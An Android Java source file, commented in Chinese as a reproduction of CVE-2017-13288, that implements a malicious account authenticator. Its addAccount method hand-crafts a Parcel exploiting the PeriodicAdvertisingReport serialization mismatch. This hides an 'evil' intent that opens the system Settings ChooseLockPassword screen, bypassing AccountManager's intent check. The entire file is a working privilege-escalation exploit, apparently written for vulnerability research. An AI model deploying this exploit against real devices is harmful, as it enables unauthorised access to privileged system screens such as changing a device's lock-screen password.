package me.safex;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.AccountManager;
import android.accounts.NetworkErrorException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

/**
 * 案例 1：CVE-2017-13288 漏洞复现
 * 在这个案例中，我们会创建一个 Android 服务，用于演示如何利用 PeriodicAdvertisingReport 类的序列化漏洞。
 */
public class MyAuthenticatorCVE201713288 extends AbstractAccountAuthenticator {
    private Context mContext;
    private static final String TAG = "MyAuthenticator";

    public MyAuthenticatorCVE201713288(Context context) {
        super(context);
        this.mContext = context;
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
        Log.v(TAG, "addAccount");

        // Create the Parcel objects for serialization
        Parcel parcelData = Parcel.obtain();
        Parcel serializedData = Parcel.obtain();

        // Setup the serialized data
        serializedData.writeInt(2); // Number of elements in the map
        serializedData.writeString("mismatch");
        serializedData.writeInt(4); // VAL_PARCELABLE
        serializedData.writeString("android.bluetooth.le.PeriodicAdvertisingReport");
        serializedData.writeInt(1); // syncHandle
        serializedData.writeInt(1); // txPower
        serializedData.writeInt(1); // rssi
        serializedData.writeInt(1); // dataStatus
        serializedData.writeInt(1); // flag
        serializedData.writeInt(0x144); // Length of KEY_INTENT:evilIntent

        // Insert the malicious intent
        serializedData.writeString(AccountManager.KEY_INTENT);
        serializedData.writeInt(4);
        serializedData.writeString("android.content.Intent");
        serializedData.writeString(Intent.ACTION_RUN);
        Uri.writeToParcel(serializedData, null);
        serializedData.writeString(null); // mType is null
        serializedData.writeInt(0x10000000); // Flags
        serializedData.writeString(null); // mPackage is null
        serializedData.writeString("com.android.settings");
        serializedData.writeString("com.android.settings.password.ChooseLockPassword");
        serializedData.writeInt(0); // mSourceBounds = null
        serializedData.writeInt(0); // mCategories = null
        serializedData.writeInt(0); // mSelector = null
        serializedData.writeInt(0); // mClipData = null
        serializedData.writeInt(-2); // mContentUserHint
        serializedData.writeBundle(null);

        // Padding data
        serializedData.writeString("Padding-Key");
        serializedData.writeInt(0); // VAL_STRING
        serializedData.writeString("Padding-Value");

        // Finalize the Parcel data
        int length = serializedData.dataSize();
        parcelData.writeInt(length);
        parcelData.writeInt(0x4c444E42); // Bundle magic
        parcelData.appendFrom(serializedData, 0, length);
        parcelData.setDataPosition(0);

        // Create the Bundle
        Bundle evilBundle = new Bundle();
        evilBundle.readFromParcel(parcelData);

        Log.d(TAG, "Evil bundle created: " + evilBundle.toString());
        return evilBundle;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return "";
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) throws NetworkErrorException {
        return null;
    }

    // Other required methods (can be left with default implementations)
}
